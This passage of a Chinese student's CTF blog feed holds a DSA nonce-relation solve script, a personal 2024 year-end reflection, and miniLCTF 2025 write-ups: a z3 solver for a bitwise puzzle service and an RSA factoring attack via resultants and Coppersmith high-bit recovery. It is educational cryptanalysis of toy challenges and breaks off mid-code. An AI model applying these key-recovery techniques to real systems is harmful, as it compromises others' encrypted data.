class="string">&#x27;y =&#x27;</span>, y)</span><br><span class="line"><span class="built_in">print</span>(sign(<span class="string">b&#x27;nssctfround#1&#x27;</span>, pub, pri, nonce))</span><br><span class="line"><span class="built_in">print</span>(sign(<span class="string">b&#x27;nssctfround#1&#x27;</span>, pub, pri, <span class="number">12345</span>*nonce + <span class="number">67890</span>))</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">y = 516079379252376231001717898324355848864109868582016554029703521946402522000955354396295307046881971504216991061930299508521161039333927590076006514531946316725453062373440451679354041777376121961468715242703413529070177041819221792817124111175287475946526246377103779752133378942603534385789689950337366490082828044596711426514502752548887337695502949798115745655734033592905036846835127551577851715558217775334831352232997052342694255476534837857477388530834954919414905007702912216496977764789386913244009912368937860550222726279524193115767983754873150853915852619223039800432272818237552774389220137762595332280</span></span><br><span class="line"><span class="string">(81900716895065212453759953296615257914462909922962929287345063257120550453427, 45144894416226080526306932143570511284754744855790908537643986192724824691890)</span></span><br><span class="line"><span class="string">(60471460394555700734359895323450929800168788093422384886037011624642263106556, 74754852228035293908666429128869604520827363733944834534730568060790683199921)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>附上丑丑的推导</p>
<p><img src="https://ice.frostsky.com/2024/08/23/c572b534fc3cd26be69322c1fcf23c68.png" alt="c572b534fc3cd26be69322c1fcf23c68.png"></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line">y = </span><br><span class="line">r1,s1 = (, )</span><br><span class="line">r2,s2 = (, )</span><br><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">g = </span><br><span class="line">msg = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">h = <span class="built_in">int</span>(hashlib.sha256(msg).digest().<span class="built_in">hex</span>(),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">a = </span><br><span class="line">b = </span><br><span class="line"></span><br><span class="line">k = ((h*(r2 - r1) + b*r1*s2)*gmpy2.invert((r2*s1-a*r1*s2),q)) % q</span><br><span class="line"></span><br><span class="line">m1 = (k*s1 - h)*gmpy2.invert(r1,q) % q</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m1))</span><br><span class="line"></span><br><span class="line">k1 = a*k+b</span><br><span class="line"></span><br><span class="line">m2 = (k1*s2 - h)*gmpy2.invert(r2,q) % q</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m2))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>还有的题型遇到了再补上叭……</p>
]]></content>
      <tags>
        <tag>NOTE</tag>
      </tags>
  </entry>
  <entry>
    <title>2024の总结</title>
    <url>/2024/12/31/2024%E3%81%AE%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>细想来自己开始接触CTF也大半年了，这期间发生了蛮多的事，刚好年末了，顺带写个年终总结吧，不过其实也算不上，毕竟时间跨度不止一年了。</p>
<span id="more"></span>

<h1 id="About-CTF"><a href="#About-CTF" class="headerlink" title="About CTF"></a>About CTF</h1><p>  其实严格来说从去年高考完选志愿之前其实都对网络安全这方面 没啥了解(其实唯一的了解就来自某个逆天电视剧)，现在所在的密码科学与技术这个专业也只是第一志愿没录上之后凑数的,当时也只是从各种途径了解到这个专业前景蛮好。具体了解也是一片空白。</p>
<p>  填完志愿的那个暑假，闲着无聊的我在翻学校的公众号时发现了网安协会，当时想着自己也是这方面的加了也挺合适，进群后就看到学长在宣传战队，当时觉得”wc，战队唉，好帅好牛逼“，所以去听了会长的招新宣讲，也就是我们的无敌<a href="https://github.com/Boogipop">Boogipop神！</a>。给当时的我留下了不可磨灭的震撼，看完我直接化身热血小子恨不得直接把某个人电脑黑了看看实力。当时因为自己专业的原因，选择了Crypto方向学习(这个方向黑别人电脑好像难度蛮大哈哈哈哈哈哈哈哈哈)，不过其实暑假并没有学到什么，甚至只看了看古典密码，当时刚结束地狱般的高三玩心太重了根本坐不住hhh，在最后的招新考核中也只做出了一道古典就耻辱下机了，当时连Python完全不会，只会做txt题，看到后缀是.py的文件直接抓瞎哈哈哈。也是不出意外地被刷掉了。当时准大一通过考核的就只有一个，就是这位现在的<a href="http://www.miaoaixuan.cn/">misc✌</a>.</p>
<p> 大一上学期其实都没怎么学，还没摆脱高中思维，只是在按部就班的学高数，考四级这些，没啥好说的，跳过跳过……</p>
<p>  寒假才算真正开始学习，先在图书馆里花一周速成了一下Python，然后跟着BUU上刷了下题，学了学基础的RSA…..然后就去参加考核哩，现在想想当时其实相当于啥都没学，不过多亏考核难度不大，也是成功通过了，成为了HnuSec的一员.</p>
<p>  然后是大一下,这学期打了蛮多比赛的，虽然大部分都是新生赛吧，在打比赛的时候也通过题目学到了很多，我个人觉得这种以赛促学其实蛮有效果的，在对比赛的复现中也学到了好多新知识。从只会套RSA板子解题到可以自己独立做出一些比较难的题，这当然也离不开战队里学长<a href="https://shinichicun.top/">Shin</a>.的培养啦，有不会的问他就对了，简直无所不知！之后嘛也没啥好说的就打比赛，复现这样循环着来了……</p>
<p>  又是一年暑假，其实暑假学的还蛮多，因为之前相当于只是对RSA比较熟悉，所以暑假着重研究了一下其他的加密算法，包括对称密码，椭圆曲线(这个现在还是不太会，算是一个挖了比较久的坑了)。然后给战队的招新赛出了题，也是在暑假，萌生了想加入联合战队的想法，感觉是一个更高的平台吧，认识更多厉害的师傅也能更快的成长，所以暑假的学习似乎也显得更有动力了？(应该吧)</p>
<p>  所以在刚开学的时候也是参加了NepCTF，并在爆零耻辱下机后“厚颜无耻”地交了自己的简历表达了自己想加入Nepnep的想法，经过两个月(漫长)的考核之后也是成功加入了Nepnep，也是完成了自己的一个阶段性目标。这学期也是因为加了战队所以紧迫感也是挺足，或主动或被动的学了一些东西，但是加上校队同届专注打密码的目前好像就我一个，学长大四了也要忙毕设的事情。所以还是有些紧迫感的。最近几天也稍微计划了一下寒假的学习计划，希望不要咕咕……</p>
<p>闲着无聊经常翻其他师傅的博客，时常感叹于别人的的厉害，总是不自量力地换算别人在我这个时候的实力然后被打击第二次。所以怎么说呢。其实“内耗”还挺严重的，经常学着学着就开始莫名emo和焦躁，怀疑自己对于密码的坚持，自己究竟适合吗。总是埋怨自己怎么还在学这么基础的东西，唉。总之希望明年专注于当下吧，不要让别人影响自己（立flag</p>
<h1 id="About-Life"><a href="#About-Life" class="headerlink" title="About Life"></a>About Life</h1><p>谈谈学业，唉一言难尽，保研估计是指望不上了，大四准备考研吧呜呜呜。上学期因为刚接触CTF，有一种莫名的热情，加上各种因素，导致CTF和学业的平衡不是很好，其实回过头来看，属于是技术没学好，学业也落下了。</p>
<p>今年其实过的还是蛮充实的，暑假跟高中同学去西安旅游，几个人喝强爽喝的烂醉(这东西真有问题吧)。然后去了博物院，城墙……。这学期去看了心心念念的许嵩的演唱会。</p>
<p><a href="https://img.tg/image/OEPiR1"><img src="https://ooo.0x0.ooo/2024/12/31/OEPiR1.jpg" alt="OEPiR1.jpg"></a></p>
<p>总的来说是充实的一年www（其实是写到这开始莫名烦躁不想写了）</p>
<h1 id="About-Love"><a href="#About-Love" class="headerlink" title="About Love"></a>About Love</h1><p>关于感情，说来惭愧。已经被甩快两年的我还是忘不掉初恋，这下真成舔狗了唉。再加上另一方面对感情的需求也没有那么强烈。导致我今年一直处在纯宅男状态，上了大学没加几个女生。短时间内估计是就这样了。随缘吧</p>
<h1 id="Future"><a href="#Future" class="headerlink" title="Future"></a>Future</h1><p>奇怪，这总结怎么越写越不想写…..自己的文字能力真是退化的厉害。但还是要展望一下的。希望明年少点精神内耗吧，专注学习密码，顺便希望点一些其他的技能树吧。</p>
]]></content>
      <tags>
        <tag>Thinking</tag>
      </tags>
  </entry>
  <entry>
    <title>2025miniLCTF</title>
    <url>/2025/05/11/2025miniLCTF/</url>
    <content><![CDATA[<p>owo</p>
<p>题目质量感觉还蛮高。学到了一些东西。只是可惜知道的时候已经快结束了，没啥时间打。现在来复现一下</p>
<span id="more"></span>

<h1 id="1，babaisiginsigin"><a href="#1，babaisiginsigin" class="headerlink" title="1，babaisiginsigin"></a>1，babaisiginsigin</h1><p>z3一把梭XD，顺便学了一下z3的使用，之前没咋用过。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_level1</span>(<span class="params">m, x, y</span>):</span><br><span class="line">    <span class="keyword">return</span> (m | x) + (m | y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_level2</span>(<span class="params">m, x, y</span>):</span><br><span class="line">    <span class="keyword">return</span> (m | x) + (m ^ y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">level</span>(<span class="params">conn, calculate, x, y, guess, description, test_times</span>):</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(test_times):</span><br><span class="line">        conn.sendall(<span class="string">b&quot;Enter your number: &quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># 设置 5 秒超时</span></span><br><span class="line">        conn.settimeout(<span class="number">5</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                test = <span class="built_in">int</span>(data.strip())</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                conn.sendall(<span class="string">b&quot;Invalid input. Bye.\n&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            result = calculate(test, x, y)</span><br><span class="line">            conn.sendall(<span class="string">f&quot;Calculation result: <span class="subst">&#123;result&#125;</span>\n&quot;</span>.encode())</span><br><span class="line">        <span class="keyword">except</span> socket.timeout:</span><br><span class="line">            conn.sendall(<span class="string">b&quot;Time out! Respond in 5 seconds.\n&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    conn.sendall(<span class="string">f&quot;\nNow, guess the result of <span class="subst">&#123;description&#125;</span> for m = <span class="subst">&#123;guess&#125;</span>:\n&quot;</span>.encode())</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 设置 5 秒超时</span></span><br><span class="line">    conn.settimeout(<span class="number">5</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        data = conn.recv(<span class="number">1024</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            user_guess = <span class="built_in">int</span>(data.strip())</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            conn.sendall(<span class="string">b&quot;Invalid input. Bye.\n&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        correct_result = calculate(guess, x, y)</span><br><span class="line">        <span class="keyword">if</span> user_guess == correct_result:</span><br><span class="line">            conn.sendall(<span class="string">b&quot;Correct! Proceeding to next level...\n\n&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            conn.sendall(<span class="string">b&quot;Wrong guess! Exiting...\n&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> socket.timeout:</span><br><span class="line">        conn.sendall(<span class="string">b&quot;Time out! You took too long to respond.\n&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">handle_client</span>(<span class="params">conn, addr, flag</span>):</span><br><span class="line">    conn.sendall(<span class="string">b&quot;Welcome to Puzzle!\n\n&quot;</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment"># Level 1</span></span><br><span class="line">        x = random.getrandbits(<span class="number">30</span>)</span><br><span class="line">        y = random.getrandbits(<span class="number">30</span>)</span><br><span class="line">        guess = random.getrandbits(<span class="number">30</span>)</span><br><span class="line">        conn.sendall(<span class="string">b&quot;Level 1:\n&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> level(conn, calculate_level1, x, y, guess, <span class="string">&quot;(m | x) + (m | y)&quot;</span>, test_times=<span class="number">2</span>):</span><br><span class="line">            conn.close()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># Level 2</span></span><br><span class="line">        x = random.getrandbits(<span class="number">30</span>)</span><br><span class="line">        y = random.getrandbits(<span class="number">30</span>)</span><br><span class="line">        guess = random.getrandbits(<span class="number">30</span>)</span><br><span class="line">        conn.sendall(<span class="string">b&quot;Level 2:\n&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> level(conn, calculate_level2, x, y, guess, <span class="string">&quot;(m | x) + (m ^ y)&quot;</span>, test_times=<span class="number">2</span>):</span><br><span class="line">            conn.close()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 通关，发flag</span></span><br><span class="line">        conn.sendall(<span class="string">f&quot;Congratulations! You&#x27;ve passed all levels!\nHere is your flag: <span class="subst">&#123;flag&#125;</span>\n&quot;</span>.encode())</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        conn.sendall(<span class="string">b&quot;An error occurred. Bye.\n&quot;</span>)</span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        conn.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    host = <span class="string">&quot;0.0.0.0&quot;</span></span><br><span class="line">    port = <span class="number">2227</span></span><br><span class="line"></span><br><span class="line">    flag = os.getenv(<span class="string">&#x27;FLAG&#x27;</span>, <span class="string">&#x27;flag&#123;testflag&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    s.bind((host, port))</span><br><span class="line">    s.listen(<span class="number">5</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[+] Listening on <span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        conn, addr = s.accept()</span><br><span class="line">        threading.Thread(target=handle_client, args=(conn, addr, flag)).start()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>

<p>题目流程很简单。给出level1和level2，对于每个level有两次尝试机会。用户可自定义输入，交互会返回计算值，而通关条件是计算出给定m的结果。那很明显我们需要得到x，y的某种关系或者直接算出x，y才能计算。我一开始推了很久结果发现可以z3一把梭(z3神力！),脚本写的详细一点顺便再复习一下z3的使用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_level1</span>(<span class="params">m, x, y</span>):</span><br><span class="line">    <span class="keyword">return</span> (m | x) + (m | y)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calculate_level2</span>(<span class="params">m, x, y</span>):</span><br><span class="line">    <span class="keyword">return</span> (m | x) + (m ^ y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">m1 = <span class="number">15</span>*<span class="string">&quot;10&quot;</span></span><br><span class="line">m1 = <span class="built_in">int</span>(m1, <span class="number">2</span>)</span><br><span class="line">m2 = <span class="number">15</span>*<span class="string">&quot;01&quot;</span></span><br><span class="line">m2 = <span class="built_in">int</span>(m2, <span class="number">2</span>)</span><br><span class="line">io = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">28434</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># level 1</span></span><br><span class="line">io.recv()</span><br><span class="line">io.send(<span class="string">f&quot;<span class="subst">&#123;m1&#125;</span>&quot;</span>.encode())</span><br><span class="line"><span class="comment">#io.recv()</span></span><br><span class="line"><span class="comment"># print(io.recv())</span></span><br><span class="line">io.recvuntil(<span class="string">b&quot;Calculation result: &quot;</span>)</span><br><span class="line"><span class="comment"># r1 = eval(io.recv().split(b&quot;Calculation result: &quot;)[1])</span></span><br><span class="line">r1 = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(r1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(io.recv())</span><br><span class="line"><span class="comment">#print(io.recv())</span></span><br><span class="line">io.send(<span class="string">f&quot;<span class="subst">&#123;m2&#125;</span>&quot;</span>.encode())</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Calculation result: &quot;</span>)</span><br><span class="line">r2 = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">m = <span class="built_in">eval</span>(io.recv().split(<span class="string">b&quot;m = &quot;</span>)[-<span class="number">1</span>][:-<span class="number">2</span>])</span><br><span class="line">x = BitVec(<span class="string">&#x27;x&#x27;</span>, <span class="number">30</span>)</span><br><span class="line">y = BitVec(<span class="string">&#x27;y&#x27;</span>, <span class="number">30</span>)</span><br><span class="line">s = Solver()</span><br><span class="line">s.add((m1 | x) + (m1 | y)==r1)</span><br><span class="line">s.add((m2 | x) + (m2 | y)==r2)</span><br><span class="line"><span class="keyword">if</span> s.check() != sat:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;false&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(s.model())</span><br><span class="line">    x = s.model().<span class="built_in">eval</span>(x).py_value()</span><br><span class="line">    y = s.model().<span class="built_in">eval</span>(y).py_value()</span><br><span class="line">    res = calculate_level1(m, x, y)</span><br><span class="line">    io.send(<span class="string">f&quot;<span class="subst">&#123;res&#125;</span>&quot;</span>.encode())</span><br><span class="line"><span class="built_in">print</span>(io.recv())</span><br><span class="line"></span><br><span class="line"><span class="comment"># level 2</span></span><br><span class="line"></span><br><span class="line">io.send(<span class="string">f&quot;<span class="subst">&#123;m1&#125;</span>&quot;</span>.encode())</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Calculation result: &quot;</span>)</span><br><span class="line"><span class="comment"># r1 = eval(io.recv().split(b&quot;Calculation result: &quot;)[1])</span></span><br><span class="line">r1 = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(r1)</span><br><span class="line"><span class="built_in">print</span>(io.recv())</span><br><span class="line">io.send(<span class="string">f&quot;<span class="subst">&#123;m2&#125;</span>&quot;</span>.encode())</span><br><span class="line">io.recvuntil(<span class="string">b&quot;Calculation result: &quot;</span>)</span><br><span class="line">r2 = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">m = <span class="built_in">eval</span>(io.recv().split(<span class="string">b&quot;m = &quot;</span>)[-<span class="number">1</span>][:-<span class="number">2</span>])</span><br><span class="line">x = BitVec(<span class="string">&#x27;x&#x27;</span>, <span class="number">30</span>)</span><br><span class="line">y = BitVec(<span class="string">&#x27;y&#x27;</span>, <span class="number">30</span>)</span><br><span class="line">s = Solver()</span><br><span class="line">s.add((m1 | x) + (m1 ^ y)==r1)</span><br><span class="line">s.add((m2 | x) + (m2 ^ y)==r2)</span><br><span class="line"><span class="keyword">if</span> s.check() != sat:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;false&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span>(s.model())</span><br><span class="line">    x = s.model().<span class="built_in">eval</span>(x).py_value()</span><br><span class="line">    y = s.model().<span class="built_in">eval</span>(y).py_value()</span><br><span class="line">    res = calculate_level2(m, x, y)</span><br><span class="line">    io.send(<span class="string">f&quot;<span class="subst">&#123;res&#125;</span>&quot;</span>.encode())</span><br><span class="line"><span class="built_in">print</span>(io.recv())</span><br></pre></td></tr></table></figure>

<p>官方wp里有句话感觉很有意义“用最合适的工具解决最合适的问题，Gurobi 解决线性优化最快，SAT 求解器解决布尔逻辑最快，Z3 处理复杂混合逻辑最灵活。”确实选择了合适的工具效率会大大提升。</p>
<h1 id="2，rsasign"><a href="#2，rsasign" class="headerlink" title="2，rsasign"></a>2，rsasign</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime, inverse</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">genKeys</span>(<span class="params">nbits</span>):</span><br><span class="line">    e = <span class="number">0x10001</span></span><br><span class="line">    p = getPrime(nbits // <span class="number">2</span>)</span><br><span class="line">    q = getPrime(nbits // <span class="number">2</span>)</span><br><span class="line">    n = p * q</span><br><span class="line">    phi = n - (p + q) + <span class="number">1</span></span><br><span class="line">    d = inverse(e, phi)</span><br><span class="line">    pubkey = (n, e)</span><br><span class="line">    prikey = (d, p, q)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> pubkey, prikey</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">msg, pubkey</span>):</span><br><span class="line">    m = bytes_to_long(msg)</span><br><span class="line">    n, e = pubkey</span><br><span class="line">    c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_gift</span>(<span class="params">prikey</span>):</span><br><span class="line">    a = bytes_to_long(<span class="string">b&#x27;miniL&#x27;</span>)</span><br><span class="line">    b = bytes_to_long(<span class="string">b&#x27;mini7&#x27;</span>)</span><br><span class="line">    p, q = prikey[<span class="number">1</span>:]</span><br><span class="line">    phi = (p - <span class="number">1</span>)*(q - <span class="number">1</span>)</span><br><span class="line">    giftp = p + a</span><br><span class="line">    giftq = q + b</span><br><span class="line">    gift = <span class="built_in">pow</span>((giftp + giftq + a*b), <span class="number">2</span>, phi)</span><br><span class="line">    <span class="keyword">return</span> gift &gt;&gt; <span class="number">740</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    nbits = <span class="number">1024</span></span><br><span class="line">    pubkey, prikey = genKeys(nbits)</span><br><span class="line">    c = encrypt(flag, pubkey)</span><br><span class="line">    gift = get_gift(prikey)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;output.txt&#x27;</span>, <span class="string">&#x27;a&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(<span class="string">&#x27;pubkey = &#x27;</span> + <span class="built_in">str</span>(pubkey) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        f.write(<span class="string">&#x27;c = &#x27;</span> + <span class="built_in">str</span>(c) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        f.write(<span class="string">&#x27;gift = &#x27;</span> + <span class="built_in">str</span>(gift) + <span class="string">&#x27;\n&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>关键函数为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_gift</span>(<span class="params">prikey</span>):</span><br><span class="line">    a = bytes_to_long(<span class="string">b&#x27;miniL&#x27;</span>)</span><br><span class="line">    b = bytes_to_long(<span class="string">b&#x27;mini7&#x27;</span>)</span><br><span class="line">    p, q = prikey[<span class="number">1</span>:]</span><br><span class="line">    phi = (p - <span class="number">1</span>)*(q - <span class="number">1</span>)</span><br><span class="line">    giftp = p + a</span><br><span class="line">    giftq = q + b</span><br><span class="line">    gift = <span class="built_in">pow</span>((giftp + giftq + a*b), <span class="number">2</span>, phi)</span><br><span class="line">    <span class="keyword">return</span> gift &gt;&gt; <span class="number">740</span></span><br></pre></td></tr></table></figure>

<p>因为a和b都只有30位，把gift展开一下，约等于是(p+q)$^2$+kphi,我们自己生成几组数据不难发现k为4，用结式联立一下p*q&#x3D;n就能得到p，q之一的高位(这里尝试过grobner基不过没出，看来对于未知量少的还是结式比较nb)。然后用普通的p高位泄露去打就行啦。</p>
<p>打结式</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="comment">#from sage.matrix.matrix2 import Matrix</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">resultant</span>(<span class="params">f1, f2, var</span>):</span><br><span class="line">    <span class="keyword">return</span> Matrix.determinant(f1.sylvester_matrix(f2, var))</span><br><span class="line">n=<span class="number">103894244981844985537754880154957043605938484102562158690722531081787219519424572416881754672377601851964416424759136080204870893054485062449999897173374210892603308440838199225926262799093152616430249061743215665167990978654674200171059005559869946978592535720766431524243942662028069102576083861914106412399</span></span><br><span class="line">gift =<span class="number">2391232579794490071131297275577300947901582900418236846514147804369797358429972790212</span></span><br><span class="line">gift=gift&lt;&lt;<span class="number">740</span></span><br><span class="line">p, q = QQ[<span class="string">&#x27;x, y&#x27;</span>].gens()</span><br><span class="line">f =n-p*q</span><br><span class="line">g = (p+q)**<span class="number">2</span>-<span class="number">4</span>*(n-(p+q)+<span class="number">1</span>) - gift</span><br><span class="line">h = f.resultant(g, q)</span><br><span class="line"><span class="built_in">print</span>([f, g])</span><br><span class="line"><span class="built_in">print</span>([h, factor(h)])</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(RealField(<span class="number">1000</span>))</span><br><span class="line">h = PR(h)</span><br><span class="line"><span class="built_in">print</span>(h)</span><br><span class="line">res =h.monic().roots()</span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>

<p>经过测试发现得到的p的高229位是准确的，太有心机了刚好卡在epsilon的界上。</p>
<p>（以512bit的p为例)</p>
<p>当<code>beta=0.4</code>时，在未知位数少于等于227bit时，可以恢复p</p>
<p>当<code>beta=0.4,epsilon=0.01</code>时，在未知位数少于等于248bit时，可以恢复p</p>
<p>加一下epsilon的参数直接打即可。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">e=<span class="number">65537</span></span><br><span class="line">c=<span class="number">50810871938251627005285090837280618434273429940089654925377752488011128518767341675465435906094867261596016363149398900195250354993172711611856393548098646094748785774924511077105061611095328649875874203921275281780733446616807977350320544877201182003521199057295967111877565671671198186635360508565083698058</span></span><br><span class="line">n=<span class="number">103894244981844985537754880154957043605938484102562158690722531081787219519424572416881754672377601851964416424759136080204870893054485062449999897173374210892603308440838199225926262799093152616430249061743215665167990978654674200171059005559869946978592535720766431524243942662028069102576083861914106412399</span></span><br><span class="line">gift =<span class="number">2391232579794490071131297275577300947901582900418236846514147804369797358429972790212</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(<span class="number">8.50163959012197759505352373881837525967941479473010602057836865805627052910871914284361623987618060959240804297171916281996509283848634874980052464884478767329803877247851607313541184922319727944953935066659961095394358139432989452855479778189020778762947568782629837455544564537937538688849538209838e153</span>))</span><br><span class="line">ph=<span class="number">8501639590121977595053523738818375259679414794730106020578368658056270529108719142843616239876180609592408042971719162819965092838486348749800524648844787</span></span><br><span class="line">p_high=ph&gt;&gt;<span class="number">229</span>&lt;&lt;<span class="number">229</span></span><br><span class="line"><span class="built_in">print</span>(p_high)</span><br><span class="line"><span class="built_in">print</span>(p_high.bit_length())</span><br><span class="line">R.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = p_high + x</span><br><span class="line">res = f.small_roots(X = <span class="number">2</span>^<span class="number">229</span>,beta=<span class="number">0.4</span>,epsilon=<span class="number">0.01</span>)</span><br><span class="line"><span class="keyword">if</span> res != []:</span><br><span class="line">    p = p_high + <span class="built_in">int</span>(res[<span class="number">0</span>])</span><br><span class="line">    q = n // p</span><br><span class="line">    <span class="built_in">print</span>(p*q-n)</span><br><span class="line">    d = gmpy2.invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">    m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">    <span class="built_in">print</span>(long_to_bytes(<span 